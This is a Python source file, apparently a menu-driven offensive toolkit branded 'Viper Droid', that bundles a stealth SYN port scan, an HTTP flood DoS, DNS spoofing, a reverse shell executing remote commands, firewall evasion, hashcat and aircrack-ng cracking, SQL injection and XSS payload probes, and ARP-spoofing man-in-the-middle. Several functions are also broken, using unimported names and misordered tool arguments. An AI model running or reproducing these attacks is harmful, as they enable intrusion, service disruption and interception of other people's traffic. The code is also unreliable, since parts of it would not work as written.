import socket
from scapy.all import IP, ICMP, send, sniff, ARP, Ether, TCP, UDP, DNS, DNSQR
import paramiko
import random
import threading
from datetime import datetime
from time import sleep
import os
import time
import subprocess
import hashlib
import requests





print(
"""
     ██╗   ██╗██╗██████╗ ███████╗███████╗██████╗ 
     ██║   ██║██║██╔══██╗██╔════╝██╔════╝██╔══██╗
     ██║   ██║██║██████╔╝█████╗  █████╗  ██████╔╝
     ██║   ██║██║██╔═══╝ ██╔══╝  ██╔══╝  ██╔══██╗
     ╚██████╔╝██║██║     ███████╗███████╗██║  ██║
      ╚═════╝ ╚═╝╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝
    Powered by Viper Droid
    """
)





# Stealth SYN Port Scan (to avoid detection by firewalls)
def syn_scan(target_ip):
    print(f"Performing Stealth SYN Scan on {target_ip}")
    open_ports = []
    for port in range(1, 1025):
        try:
            syn_packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
            response = sr1(syn_packet, timeout=1, verbose=False)

            if response is None:
                continue

            if response.haslayer(TCP) and response[TCP].flags == 0x12:
                open_ports.append(port)
                send(IP(dst=target_ip)/TCP(dport=port, flags="R"), verbose=False)

        except Exception as e:
            print(f"Error in SYN scan: {e}")

    if open_ports:
        print(f"Open ports found: {open_ports}")
    else:
        print("No open ports found")

# HTTP DoS Attack (Send multiple HTTP requests to flood server)
def http_dos(target_ip, target_port, duration=60):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
    }
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            requests.get(f"http://{target_ip}:{target_port}", headers=headers)
            print(f"Sent HTTP request to {target_ip}:{target_port}")
        except requests.RequestException as e:
            print(f"Error in HTTP request: {e}")

# DNS Spoofing (Fake DNS Response)
def dns_spoof(target_ip, fake_ip, domain):
    packet = IP(dst=target_ip)/UDP(dport=53)/DNS(qd=DNSQR(qname=domain))/DNS(rr=DNSRR(rrname=domain, rdata=fake_ip))
    send(packet)
    print(f"Sent fake DNS response to {target_ip} for domain {domain}")

# Advanced Reverse Shell (using Python)
def reverse_shell(target_ip, target_port):
    print(f"Connecting to {target_ip}:{target_port} for reverse shell")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))

    while True:
        # Receiving commands from the attacker
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break
        # Execute command and send back the result
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        s.send(output.stdout + output.stderr)

    s.close()

# Firewall Evasion Technique (fragmenting packets)
def firewall_evasion(target_ip):
    print(f"Attempting firewall evasion against {target_ip}")
    packet = IP(dst=target_ip, frag=1)/ICMP()
    send(packet, verbose=False)

# Password Cracking with Hashcat
def hashcat_crack(hash_file, wordlist):
    print(f"Cracking hash with Hashcat using {wordlist}")
    command = f"hashcat -m 0 {hash_file} {wordlist}"
    os.system(command)

# Web Vulnerability Scanner (Basic SQL Injection and XSS)
def web_vuln_scanner(target_url):
    print(f"Scanning {target_url} for vulnerabilities")
    
    # Basic SQL Injection Check
    payloads = ["' OR '1'='1", "' OR 1=1 --", "' OR 'x'='x"]
    for payload in payloads:
        try:
            response = requests.get(f"{target_url}?id={payload}")
            if "error" in response.text:
                print(f"Possible SQL Injection vulnerability found with payload: {payload}")
        except requests.RequestException as e:
            print(f"Error during SQL Injection test: {e}")
    
    # Basic XSS Check
    xss_payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>"]
    for payload in xss_payloads:
        try:
            response = requests.get(f"{target_url}?input={payload}")
            if payload in response.text:
                print(f"Possible XSS vulnerability found with payload: {payload}")
        except requests.RequestException as e:
            print(f"Error during XSS test: {e}")

# WPA/WPA2 Cracking (using aircrack-ng)
def wifi_crack(interface, capture_file, wordlist):
    print(f"Cracking WPA/WPA2 with aircrack-ng on {interface}")
    command = f"aircrack-ng -w {wordlist} -b {capture_file} {interface}"
    os.system(command)

# Advanced MITM Attack (HTTPS Decryption)
def mitm_https_decrypt(target_ip, gateway_ip):
    print(f"Performing HTTPS Decryption MITM Attack on {target_ip} with gateway {gateway_ip}")
    arp_spoof(target_ip, gateway_ip)
    arp_spoof(gateway_ip, target_ip)
    print("Intercepting HTTPS traffic (requires proxy setup like SSLStrip)")

# ARP Spoof (for MITM Attacks)
def arp_spoof(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    # Send ARP reply to target
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    send(arp)

    # Send ARP reply to gateway
    arp = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
    send(arp)

# Get MAC Address from IP
def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    request_packet = broadcast/arp_request
    response = srp(request_packet, timeout=1, verbose=False)[0]
    return response[0][1].hwsrc

# Main Menu
def main():
    while True:
        print("\nSelect an option:")
        print("1. Stealth SYN Port Scan")
        print("2. HTTP DoS Attack")
        print("3. DNS Spoofing")
        print("4. Reverse Shell")
        print("5. Firewall Evasion")
        print("6. Password Cracking with Hashcat")
        print("7. Web Vulnerability Scanner")
        print("8. WPA/WPA2 Wi-Fi Cracking")
        print("9. Advanced MITM with HTTPS Decryption")
        print("10. Exit")

        choice = input("Enter choice (1-10): ")

        if choice == '1':
            target_ip = input("Enter the target IP: ")
            syn_scan(target_ip)

        elif choice == '2':
            target_ip = input("Enter target IP: ")
            target_port = int(input("Enter target port: "))
            duration = int(input("Enter DoS duration in seconds: "))
            http_dos(target_ip, target_port, duration)

        elif choice == '3':
            target_ip = input("Enter target IP: ")
            fake_ip = input("Enter fake IP: ")
            domain = input("Enter domain to spoof: ")
            dns_spoof(target_ip, fake_ip, domain)

        elif choice == '4':
            target_ip = input("Enter target IP for reverse shell: ")
            target_port = int(input("Enter target port: "))
            reverse_shell(target_ip, target_port)

        elif choice == '5':
            target_ip = input("Enter target IP for firewall evasion: ")
            firewall_evasion(target_ip)

        elif choice == '6':
            hash_file = input("Enter hash file path: ")
            wordlist = input("Enter wordlist path: ")
            hashcat_crack(hash_file, wordlist)

        elif choice == '7':
            target_url = input("Enter target URL for vulnerability scan: ")
            web_vuln_scanner(target_url)

        elif choice == '8':
            interface = input("Enter wireless interface: ")
            capture_file = input("Enter capture file: ")
            wordlist = input("Enter wordlist file path: ")
            wifi_crack(interface, capture_file, wordlist)

        elif choice == '9':
            target_ip = input("Enter target IP: ")
            gateway_ip = input("Enter gateway IP: ")
            mitm_https_decrypt(target_ip, gateway_ip)

        elif choice == '10':
            print("Exiting program.")
            break

        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
